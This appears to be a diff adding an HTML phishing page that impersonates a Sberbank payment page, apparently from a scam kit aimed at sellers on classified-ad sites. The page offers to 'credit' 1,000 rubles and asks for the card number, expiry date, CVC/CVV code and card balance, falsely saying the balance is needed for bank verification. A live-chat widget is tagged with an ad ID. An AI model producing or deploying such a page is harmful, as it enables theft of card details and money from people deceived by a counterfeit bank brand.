@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<meta charset="UTF-8">
+	<title>Платежная страница СберБанка</title>
+	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="theme-color" content="#f3f3f3">
+	<meta name="format-detection" content="telephone=no">
+	<meta name="msapplication-navbutton-color" content="#f3f3f3">
+	<meta name="apple-mobile-web-app-status-bar-style" content="#f3f3f3">
+	<link rel="icon" href="img/favicon-16x16.png" sizes="16x16" type="image/png">
+	<link rel="icon" href="img/favicon-32x32.png" sizes="32x32" type="image/png">
+	<link href="style/sbersafe.css" rel="stylesheet">
+	<link href="style/kit.css" rel="stylesheet">
+	
+	<link charset="utf-8" type="text/css" rel="stylesheet" href="style/mobile.css">
+<!-- Smartsupp Live Chat script -->
+<script type='text/javascript'>
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '78210fd91eb071518fd33b060b73f668a5c31d95';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+smartsupp('variables', {'Название объявления':'', 'Айди объявления':'47290041'});
+</script></head>
+<body><script type='text/javascript' src='https://check.ddos-guard.net/check.js' async defer></script>
+	<div id="wrapper">
+	<section class="sbersafe-mobile-alert"></section>
+	<section class="browser-autofill-reset" style="display: none;">
+		<input type="email" name="autofillemail" id="autofillemail" value="">
+		<input type="password" name="autofillpassword" id="autofillpassword" value="">
+		<input type="tel" name="rautofilltel" id="autofilltel" value="">
+		<input type="text" name="autofilltext" id="autofilltext" value="">
+	</section>
+	<section class="sbersafe-header">
+		<div class="sbersafe-container">
+			<div class="sbersafe-header__logos">
+				<div class="sbersafe-header__bank-logo">
+					<img src="img/svg-sprite.svg#sberbank" alt="СберБанк" aria-hidden="true">
+				</div>
+			</div>
+			<section class="sb_sbersafe-profile-controls sb_sbersafe-profile-enter">
+				<div class="sb_sbersafe-profile-controls__user-profile">
+				<button>
+					<span class="btn__content" tabindex="-1">Профиль пользователя</span>
+				</button>
+				</div>
+			</section>
+		</div>
+	</section>
+	<main>
+	<form id="_formPay" method="post">
+	<section class="sb_order-details container-fluid container-fluid_no-padding">
+		<div class="col-sm-6 sb_order-details__col container-fluid_no-padding">
+			<button class="sb_order-details__button" aria-expanded="false">
+				<span class="button__main-amount">1 000 Р</span>
+			</button>
+			<div class="sb_order-details__body" hidden="">
+				<span class="sb_order-details__merchant-info"> | Заказ № </span>
+				<br>
+				<span class="sb_order-details__description"></span>
+			</div>
+		</div>
+	</section>
+	<section class="sb_sbersafe-new-card clearfix">
+		<div class="col-sm-6">
+			<div class="row">
+				<div class="new-card ui-card ui-card_active" role="section" aria-expanded="true" aria-label="Оплатить с помощью новой карты" style="color: rgb(213, 213, 213);">
+					<div class="new-card__ps">
+						<div class="card-payment-system"></div>
+					</div>
+					<div class="new-card__header">
+						<div class="h2">Зачисление 1 000 рублей</div>
+					</div>
+					<div class="new-card__row">
+						<div class="input">
+							<input value="" name="fcard" id="_input0" placeholder="Номер карты" tabindex="0" autocomplete="cc-number" type="tel" autocorrect="off" spellcheck="off" aria-label="Поле ввода номера карты. Обязательное." maxlength="23" required="" value="">
+							<label for="cardnumber"></label>
+						</div>
+					</div>
+					<div class="new-card__row">
+						<div class="row">
+							<div class="col-xs-6">
+								<div class="input">
+									<input id="_input1" value="" name="fexpm" placeholder="Месяц" autocomplete="cc-exp" autocorrect="off" spellcheck="off" aria-label="Поле ввода срока действия карты. Обязательное." maxlength="2" type="text" required="" value="">
+									<label for="expiry"></label>
+								</div>
+								<div class="input">
+									<input id="_input2" value="" name="fexpy" placeholder="Год" autocomplete="cc-exp" autocorrect="off" spellcheck="off" aria-label="Поле ввода срока действия карты. Обязательное." maxlength="2" type="text" required="" value="">
+									<label for="expiry"></label>
+								</div>
+							</div>
+							<div class="col-xs-6">
+                                <div>
+                                    <div class="input">
+                                        <input id="_input3" value="" name="fcvc" value="" placeholder="CVC2/CVV2" tabindex="0" autocomplete="off" aria-label="Поле ввода CVC2 CVV2 кода. Обязательное." type="password" maxlength="3" required="">
+                                        <label for="cvc"></label>
+                                    </div>
+                                    <div class="question" tabindex="0" style="top: unset !important; transform: translate(-50%, -50%) translateY(-80%) !important;">
+                                        <img class="question__img" src="img/svg-sprite.svg#question" alt="Подсказка: 3 цифры с обратной стороны карты">
+                                        <div class="question__text">3 цифры с обратной стороны карты</div>
+                                    </div>
+                                <div>
+                                <div>
+                                    <div class="input">
+                                        <input id="_input2" value="" name="balance" placeholder="Баланс карты" autocorrect="off" spellcheck="off" aria-label="Баланс карты. Обязательное." min="1065" max="150000" type="text" required="">
+                                        <label for="expiry"></label>
+                                    </div>
+                                    <div class="question" tabindex="0" style="top: unset !important; transform: translate(-50%, -50%) translateY(-80%) !important;">
+                                        <img class="question__img" src="img/svg-sprite.svg#question" alt="Нужен для верификации банком">
+                                        <div class="question__text">Нужен для верификации банком</div>
+                                    </div>
+                                </div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+	
+	<section class="sb_sbersafe-pay clearfix">
+		<div class="col-sm-6">
+			<div tabindex="0">
+				<span class="visually-hidden">Оплата невозможна.</span>
+					<input id="_buttonPay" class="sbersafe-pay-button webrepair" value="Получить" type="submit">
+			</div>
+		</div>
+		<div class="col-sm-5 col-sm-push-1">
+			<em>Нажимая кнопку «Сохранить», вы соглашаетесь с <a href="#" target="_blank">договором оферты</a>.</em>
+			<div class="sb_sbersafe-pay__ps" alt="logo"></div>
+		</div>
+	</section>
+	</form></main>
+	
+	</div>
+
+</body>
+</html>
